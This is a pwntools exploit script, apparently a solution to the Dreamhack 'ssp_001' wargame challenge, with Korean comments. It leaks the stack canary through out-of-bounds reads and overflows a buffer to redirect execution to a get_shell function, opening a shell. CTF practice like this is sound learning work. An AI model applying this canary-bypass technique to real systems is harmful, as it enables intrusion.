from pwn import *
import binascii

#p = process("./ssp_001")
p = remote('host2.dreamhack.games', 24395)

#P 131 130 129하면 카나리 값을 알아낼 수 있다.
#get_shell의 주소는 080486B9
#마지막에 E하고 name_len은 64+4(canary)+4*2(쓰레기값)+4(리턴주소)

context.arch="amd64"

#gdb.attach(p)
#raw_input()
p.recvuntil("> ")
p.sendline("P")
p.recvuntil("Element index : ")
p.sendline("131")
data = p.recvline()[26:28]
p.recvuntil("> ")
p.sendline("P")
p.recvuntil("Element index : ")
p.sendline("130")
data += p.recvline()[26:28]
p.recvuntil("> ")
p.sendline("P")
p.recvuntil("Element index : ")
p.sendline("129")
data += p.recvline()[26:28]
data = binascii.unhexlify(data) 
data += b"\x00"
canary = data[::-1]

payload = b"a"*64
payload += canary
payload += b"a"*8
payload += b"\x08\x04\x86\xB9"[::-1]
print(payload)

p.recvuntil("> ")
p.sendline("E")
p.recvuntil("Name Size : ")
p.sendline("80")
p.recvuntil("Name : ")
p.sendline(payload)

p.interactive()